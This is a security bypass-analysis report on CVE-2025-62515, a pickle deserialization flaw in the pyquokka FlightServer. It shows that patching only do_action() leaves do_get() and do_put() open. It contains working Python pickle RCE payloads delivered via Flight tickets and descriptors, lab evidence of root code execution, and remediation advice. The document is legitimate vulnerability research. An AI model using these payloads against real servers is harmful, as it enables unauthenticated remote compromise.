# Bypass Analysis: CVE-2025-62515

## Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-62515 |
| **Vulnerability** | Insecure Deserialization via `pickle.loads()` in pyquokka FlightServer |
| **Fix Status** | **UNPATCHED** — no fix exists in the repository |
| **Simulated Fix** | Replaced `pickle.loads()` with `json.loads()` in `do_action()` method only |
| **Bypass Result** | ✅ **BYPASS SUCCESSFUL** — 2 alternative code paths achieve identical RCE |
| **Bypass Vectors** | `do_get()` (line 98) and `do_put()` (line 46) |
| **Severity** | **CRITICAL** — same RCE impact as original vulnerability |

---

## Fix Status: UNPATCHED

**Critical finding**: There is no fix commit for CVE-2025-62515 in the pyquokka repository. The GHSA advisory (GHSA-f74j-gffq-vm9p) was published on 2025-10-17, but no remediation has been committed as of the latest code (master branch).

- The git history shows no changes to `pyquokka/flight.py` between v0.3.1 and master
- No commits mention pickle, security, or deserialization fixes
- The `pickle.loads()` calls remain in all 5 vulnerable sinks

Since no fix exists, this bypass analysis simulates the **most realistic partial fix** a developer would apply and demonstrates why it would be insufficient.

---

## Simulated Fix Description

To demonstrate the bypass, we created a "patched" version of `flight.py` that applies the fix a developer would most likely implement in response to the CVE advisory:

### What the simulated fix does:
1. **`set_configs` action (line 283)**: Replaced `pickle.loads(action.body.to_pybytes())` with `json.loads(action.body.to_pybytes().decode('utf-8'))`
2. **`cache_garbage_collect` action (line 305)**: Same replacement — `pickle.loads()` → `json.loads()`

### What the simulated fix does NOT cover:
1. **`do_get()` method (line 98)**: `pickle.loads(ticket.ticket)` — UNCHANGED
2. **`do_put()` method (line 46)**: `pickle.loads(key[1])` — UNCHANGED
3. **`do_get()` inner (line 220)**: `pickle.loads(input_requirements)` — UNCHANGED

### Why this simulated fix is realistic:
- The CVE advisory specifically calls out the `set_configs` action at line 283
- Developers typically fix the reported code path without auditing the entire file
- The `do_get()` and `do_put()` methods appear to handle "internal" data (Flight tickets and descriptors), which a developer might consider trusted
- The `do_action()` method is the most obvious entry point since `set_configs` is explicitly mentioned in the advisory

### Patched file location:
- `lab/flight_patched.py`
- Dockerfile: `lab/Dockerfile.patched`
- Compose: `lab/docker-compose-bypass.yml`

---

## Bypass Hypothesis

### Hypothesis
Even if a developer patches the `do_action()` method to use `json.loads()` instead of `pickle.loads()`, the same vulnerability class exists in the `do_get()` and `do_put()` methods of the same FlightServer class. These methods use `pickle.loads()` on data received directly from the network (Flight tickets and descriptors), and are equally accessible to unauthenticated attackers.

### Rationale
1. The vulnerability is not a single bug but a **systemic pattern** — `pickle.loads()` is used on network input in 5 locations
2. `do_get()` and `do_put()` are standard Apache Arrow Flight protocol operations, accessible to any client
3. The Flight ticket and descriptor are attacker-controlled data — they are sent by the client, not generated server-side
4. No authentication is required for any of these code paths

### Expected outcome
A pickle RCE payload sent via `FlightClient.do_get(Ticket(payload))` or `FlightClient.do_put(descriptor_with_payload)` will achieve identical RCE on the "patched" server, completely bypassing the `do_action()` fix.

---

## Bypass Method

### Bypass Vector 1: `do_get()` Ticket Deserialization (Line 98)

**Protocol operation**: `FlightClient.do_get(ticket)` — completely different from `FlightClient.do_action()`

**Vulnerable sink**:
```python
# flight.py line 98
def do_get(self, context, ticket):
    mode, actor_id, channel_id, input_requirements, exact, sorted_reqs = pickle.loads(ticket.ticket)
```

**Delivery mechanism**:
```python
import pyarrow.flight, pickle, os

class RCEPayload:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

client = pyarrow.flight.connect("grpc://TARGET:5005")
ticket = pyarrow.flight.Ticket(pickle.dumps(RCEPayload()))
reader = client.do_get(ticket)  # RCE fires during pickle.loads(ticket.ticket)
```

**Why it works**: The Flight protocol's `GetFlightInfo`/`DoGet` path is entirely separate from `DoAction`. The ticket bytes are client-supplied and pass directly to `pickle.loads()` at line 98. The fix to `do_action()` has no effect on this code path.

### Bypass Vector 2: `do_put()` Descriptor Deserialization (Line 46)

**Protocol operation**: `FlightClient.do_put(descriptor, schema)` — another independent protocol operation

**Vulnerable sink**:
```python
# flight.py line 44-46
def do_put(self, context, descriptor, reader, writer):
    key = FlightServer.descriptor_to_key(descriptor)
    is_push, name, my_format = pickle.loads(key[1])
```

**Delivery mechanism**:
```python
import pyarrow.flight, pyarrow, pickle, os

class RCEPayload:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

client = pyarrow.flight.connect("grpc://TARGET:5005")
descriptor = pyarrow.flight.FlightDescriptor.for_command(pickle.dumps(RCEPayload()))
schema = pyarrow.schema([("dummy", pyarrow.int32())])
batch = pyarrow.record_batch([pyarrow.array([1])], schema=schema)
writer, reader = client.do_put(descriptor, schema)  # RCE fires during pickle.loads(key[1])
writer.write_batch(batch)
writer.close()
```

**Why it works**: The descriptor's `command` field is client-supplied bytes. `descriptor_to_key()` extracts the command bytes as `key[1]`, which is then passed to `pickle.loads()` at line 46. This is yet another method unaffected by the `do_action()` fix.

---

## Bypass Script

**Location**: `poc/bypass_poc.py`

The bypass script:
1. Verifies the fix blocks original vectors (`set_configs` and `cache_garbage_collect`)
2. Exploits the `do_get()` ticket deserialization (line 98) — **BYPASS #1**
3. Exploits the `do_put()` descriptor deserialization (line 46) — **BYPASS #2**
4. Creates marker files on the server to prove RCE
5. Reports results summary

---

## Test Results

### Test Environment

| Component | Details |
|---|---|
| **Patched Container** | `cve-2025-62515-patched` |
| **Vulnerable Container** | `cve-2025-62515-vulnerable` |
| **Patched Image** | `cve-2025-62515-bypass-patched:latest` |
| **Fix Applied** | `json.loads()` in `do_action()` for `set_configs` and `cache_garbage_collect` |

### Results Against PATCHED Container

| Vector | Method | Line | Result |
|--------|--------|------|--------|
| Original: `set_configs` | `do_action()` | 283 | ✅ **BLOCKED** — `json.loads()` rejects pickle bytes |
| Original: `cache_garbage_collect` | `do_action()` | 305 | ✅ **BLOCKED** — `json.loads()` rejects pickle bytes |
| **Bypass: `do_get` ticket** | **`do_get()`** | **98** | ❌ **RCE ACHIEVED** — `pickle.loads()` still present |
| **Bypass: `do_put` descriptor** | **`do_put()`** | **46** | ❌ **RCE ACHIEVED** — `pickle.loads()` still present |

### Verification Evidence — `do_get` Bypass on Patched Container

```
$ docker exec cve-2025-62515-patched cat /tmp/cve-2025-62515-bypass
uid=0(root) gid=0(root) groups=0(root)
---
18dc2a4cb1ba
---
BYPASS: RCE via do_get ticket deserialization (line 98)
Fix only patched do_action() — do_get() still uses pickle.loads()
```

### Verification Evidence — `do_put` Bypass on Patched Container

```
$ docker exec cve-2025-62515-patched cat /tmp/cve-2025-62515-bypass-doput
uid=0(root) gid=0(root) groups=0(root)
---
18dc2a4cb1ba
---
BYPASS: RCE via do_put descriptor deserialization (line 46)
Fix only patched do_action() — do_put() still uses pickle.loads()
```

### Cross-Validation: Bypass Works on Vulnerable Container Too

The `do_get` bypass was also tested against the unpatched vulnerable container to confirm it uses a genuinely different code path:

```
$ docker exec cve-2025-62515-vulnerable cat /tmp/cve-2025-62515-bypass-vuln
uid=0(root) gid=0(root) groups=0(root)
BYPASS_WORKS
```

This confirms the bypass vectors are independent code paths that work regardless of whether `do_action()` is patched.

### Server Stability After Bypass

The patched server remained healthy after all bypass exploitation attempts:
```
$ docker inspect --format '{{.State.Health.Status}}' cve-2025-62515-patched
healthy
```

The server is repeatedly exploitable via the bypass vectors, just as with the original vulnerability.

---

## Severity Assessment

### Bypass Impact: CRITICAL (unchanged from original CVE)

The bypass achieves **identical impact** to the original vulnerability:
- **Remote Code Execution** as the server process user (root in lab)
- **Pre-authentication** — no credentials required
- **No user interaction** required
- **Low complexity** — standard pickle deserialization exploit
- **Same network requirements** — only TCP port 5005 reachability needed

The bypass uses the **same vulnerability class** (CWE-502: Deserialization of Untrusted Data) but through **different protocol operations** and **different methods** in the FlightServer class.

### CVSS Assessment for Bypass

The bypass would carry the **same CVSS 9.8 CRITICAL** score as the original CVE:
- AV:N (network-accessible via gRPC)
- AC:L (no special conditions)
- PR:N (no authentication)
- UI:N (no user interaction)
- S:U (no scope change)
- C:H/I:H/A:H (full RCE)

---

## Root Cause of Incomplete Fix

The fundamental issue is that the vulnerability is a **systemic pattern**, not a single bug:

1. **5 `pickle.loads()` sinks** exist in `flight.py` alone
2. The fix only addresses **2 of 5** sinks (the two in `do_action()`)
3. The remaining **3 sinks** in `do_get()` and `do_put()` are equally network-accessible
4. All sinks share the same root cause: `pickle.loads()` on attacker-controlled data

Additionally, the broader codebase has **dozens more** `pickle.loads()` calls in:
- `pyquokka/core.py` — worker executor (exploitable via compromised Redis)
- `pyquokka/coordinator.py` — cluster coordinator
- `pyquokka/tables.py` — Redis table abstractions (~15 sinks)
- `pyquokka/debugger.py` — debugger module

---

## Recommended Complete Fix

To fully remediate CVE-2025-62515, ALL of the following must be done:

### 1. Replace ALL `pickle.loads()` in `flight.py` with safe alternatives

| Line | Method | Current | Recommended Fix |
|------|--------|---------|-----------------|
| 283 | `do_action` set_configs | `pickle.loads()` | `json.loads()` (config dict is simple key-value) |
| 305 | `do_action` cache_gc | `pickle.loads()` | `json.loads()` with tuple conversion |
| 46 | `do_put` | `pickle.loads()` | Safe deserialization (e.g., Arrow IPC, msgpack, or restricted unpickler) |
| 98 | `do_get` | `pickle.loads()` | Safe deserialization |
| 220 | `do_get` inner | `pickle.loads()` | Safe deserialization |

### 2. Add authentication to the FlightServer

```python
# FlightServerBase supports auth_handler parameter
super(FlightServer, self).__init__(location, auth_handler=MyAuthHandler())
```

### 3. Bind to localhost by default

Change `FlightServer("0.0.0.0", ...)` to `FlightServer("127.0.0.1", ...)` to prevent network exposure.

### 4. If pickle is required for internal communication

Implement a restricted unpickler that only allows specific safe types:

```python
import io
import pickle

SAFE_TYPES = {
    'builtins': {'int', 'float', 'str', 'bool', 'list', 'tuple', 'dict', 'set', 'NoneType'},
    'polars': {'DataFrame'},
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in SAFE_TYPES and name in SAFE_TYPES[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Forbidden: {module}.{name}")

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

### 5. Audit the entire codebase

The `pickle.loads()` pattern is endemic — `core.py`, `coordinator.py`, `tables.py`, and `debugger.py` all have the same vulnerability class.

---

## Conclusion

The bypass analysis demonstrates that **any partial fix** to CVE-2025-62515 that only addresses the reported `set_configs` code path (or even the entire `do_action()` method) would be **trivially bypassable** through alternative `pickle.loads()` sinks in `do_get()` and `do_put()`. The vulnerability is a systemic pattern with 5 independent network-reachable sinks in the same file, and fixing fewer than all 5 leaves the same critical RCE vulnerability exploitable.

Since no fix has been committed at all, the vulnerability remains fully exploitable through ALL 5 vectors. The bypass analysis serves as a warning that a future partial fix would be insufficient — comprehensive remediation must address every `pickle.loads()` call on untrusted input across the entire codebase.

---

## Files Produced

| File | Description |
|---|---|
| `poc/bypass_poc.py` | Bypass PoC script — tests both original and bypass vectors |
| `lab/flight_patched.py` | Simulated patched `flight.py` with `json.loads()` in `do_action()` |
| `lab/Dockerfile.patched` | Dockerfile for patched container |
| `lab/docker-compose-bypass.yml` | Compose file for patched container |
